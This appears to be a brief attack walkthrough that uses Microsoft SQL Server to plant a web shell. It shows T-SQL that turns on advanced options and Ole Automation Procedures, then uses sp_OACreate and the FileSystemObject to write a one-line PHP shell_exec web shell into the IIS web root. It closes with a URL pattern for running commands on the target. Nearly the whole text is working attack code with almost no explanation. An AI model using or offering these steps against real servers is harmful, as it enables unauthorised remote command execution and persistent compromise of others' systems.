First, you need to tell MSSQL to allow changes to advanced configurations.

```ruby
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
```

Once advanced options are visible, turn on the OLE feature so you can interact with the Windows COM objects.

```ruby
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;
```

Write the Web Shell

```ruby
DECLARE @OLE INT;
DECLARE @FileID INT;

-- Create the FileSystemObject
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;

-- Open the target file (8 = append/create, 1 = ASCII)
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1;

-- Write the PHP payload into the file
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>';
```

If the commands ran successfully and the permissions were correct, the file is now on the disk. You can trigger it by browsing to: `http://<target-ip>/webshell.php?c=whoami`

